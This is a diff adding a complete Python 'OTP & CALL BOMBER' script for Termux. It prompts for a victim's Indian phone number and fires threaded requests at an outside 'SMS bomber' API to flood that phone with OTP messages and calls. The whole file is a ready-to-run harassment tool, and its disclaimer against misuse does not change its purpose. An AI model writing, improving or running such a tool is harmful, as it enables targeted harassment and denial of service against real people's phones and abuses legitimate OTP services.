@@ -1,0 +1,146 @@
+#!/usr/bin/env python3
+"""
+🔥 OTP & CALL BOMBER – TERMUX TOOL
+👑 Developed by: GENIUS HACKER ADITYA
+📡 API: Vercel SMS Bomber API
+"""
+
+import os
+import sys
+import random
+import requests
+import time
+import threading
+from subprocess import call
+
+# ── GLOBAL COUNTERS ──
+success_count = 0
+failed_count = 0
+lock = threading.Lock()
+
+# ── API URL ──
+API_URL = "http://ayusmsapi.vercel.app/api/bomb"
+
+# ── CLEAR SCREEN ──
+def clear():
+    _ = call('clear' if os.name == 'posix' else 'cls')
+
+# ── BANNER ──
+def banner():
+    os.system('''
+    printf "\n"
+    printf "         ████████╗███████╗██╗   ██╗███╗   ██╗ █████╗ ███╗   ██╗\n"
+    printf "         ╚══██╔══╝██╔════╝██║   ██║████╗  ██║██╔══██╗████╗  ██║\n"
+    printf "            ██║   ███████╗██║   ██║██╔██╗ ██║███████║██╔██╗ ██║\n"
+    printf "            ██║   ╚════██║██║   ██║██║╚██╗██║██╔══██║██║╚██╗██║\n"
+    printf "            ██║   ███████║╚██████╔╝██║ ╚████║██║  ██║██║ ╚████║\n"
+    printf "            ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═══╝\n"
+    printf "\e[1;32m         ╔═══════════════════════════════════════════╗\n"
+    printf "\e[1;32m         ║         \e[0m\e[1;95m   OTP and CALL Bomber\e[0m\e[1;32m        ║\n"
+    printf "\e[1;32m         ║      \e[0m\e[1;95m  Developed by: GENIUS HACKER\e[31m  ║\n"
+    printf "\e[1;32m         ║  \e[0m\e[1;95m Only Indian mobile numbers supported\e[0m ║\n"
+    printf "\e[1;32m         ╚═══════════════════════════════════════════╝\n"
+    printf "\n"
+    printf "         \e[101m\e[1;77m                                                \e[0m\n"
+    printf "         \e[101m\e[1;77m      DISCLAIMER: Developer will not be responsible  \e[0m\n"
+    printf "         \e[101m\e[1;77m      for any misuse or damage caused by this tool.  \e[0m\n"
+    printf "         \e[101m\e[1;77m      Please do not use this script for illegal acts. \e[0m\n"
+    printf "         \e[101m\e[1;77m                                                \e[0m\n"
+    printf "\n"
+    printf "         \e[1;36m[+] Using Vercel SMS Bomber API\e[0m\n"
+    printf "         \e[1;36m[+] API: https://adibhai-sms-api.vercel.app/api/bomb\e[0m\n"
+    printf "         \e[1;36m[+] FAST MODE: Concurrent threads + high speed\e[0m\n"
+    printf "\n"
+    ''')
+
+# ── BOMB THREAD ──
+def bomb_thread(target, count, thread_id):
+    global success_count, failed_count
+    try:
+        payload = {"number": target, "count": count}
+        response = requests.post(API_URL, json=payload, timeout=30)
+        if response.status_code == 200:
+            data = response.json()
+            with lock:
+                success_count += data.get("success", 0)
+                failed_count += data.get("failed", 0)
+            print(f"\033[92m[Thread {thread_id}] Success: {data.get('success', 0)} | Failed: {data.get('failed', 0)}\033[0m")
+        else:
+            with lock:
+                failed_count += count
+            print(f"\033[91m[Thread {thread_id}] HTTP Error: {response.status_code}\033[0m")
+    except Exception as e:
+        with lock:
+            failed_count += count
+        print(f"\033[91m[Thread {thread_id}] Exception: {e}\033[0m")
+
+# ── INFINITE FAST BOMB ──
+def infinite_fast(target, rounds, threads=5, per_call=10):
+    global success_count, failed_count
+    success_count = 0
+    failed_count = 0
+
+    print(f"\n\033[93m[+] Target: {target}\033[0m")
+    print(f"\033[93m[+] Threads: {threads} | Per call count: {per_call} | Rounds: {rounds}\033[0m")
+
+    thread_list = []
+    for i in range(threads):
+        calls_per_thread = rounds // threads
+        if i < rounds % threads:
+            calls_per_thread += 1
+        for j in range(calls_per_thread):
+            t = threading.Thread(target=bomb_thread, args=(target, per_call, i+1))
+            thread_list.append(t)
+            t.start()
+            time.sleep(0.05)
+
+    for t in thread_list:
+        t.join()
+
+    clear()
+    banner()
+    print(f"\033[1;32m✅ Bombing completed for {target}!\033[0m")
+    print(f"\033[1;33m📊 Total successful OTP requests: {success_count}\033[0m")
+    print(f"\033[1;31m❌ Failed requests: {failed_count}\033[0m")
+    print(f"\033[1;36m🎯 Total rounds executed: {rounds * threads}\033[0m")
+
+# ── MAIN ──
+def main():
+    clear()
+    banner()
+
+    target = input("Enter the Victim's Phone No.: +91").strip()
+    if not target or len(target) != 10:
+        print("Invalid number! Must be 10 digits.")
+        sys.exit(1)
+
+    rounds = input("Enter number of rounds (max 200): ").strip()
+    if not rounds.isdigit():
+        print("Invalid rounds!")
+        sys.exit(1)
+    rounds = int(rounds)
+    if rounds <= 0:
+        print("Rounds must be > 0!")
+        sys.exit(1)
+    if rounds > 200:
+        print("Max 200 rounds recommended to avoid timeout.")
+        rounds = 200
+
+    threads = input("Enter number of threads (default 5): ").strip()
+    threads = int(threads) if threads.isdigit() else 5
+    if threads <= 0:
+        threads = 5
+
+    per_call = input("Enter per call count (default 10): ").strip()
+    per_call = int(per_call) if per_call.isdigit() else 10
+    if per_call <= 0:
+        per_call = 10
+
+    infinite_fast(target, rounds, threads, per_call)
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(f"\n\033[91m❌ Interrupted by user\033[0m")
+        sys.exit(0)
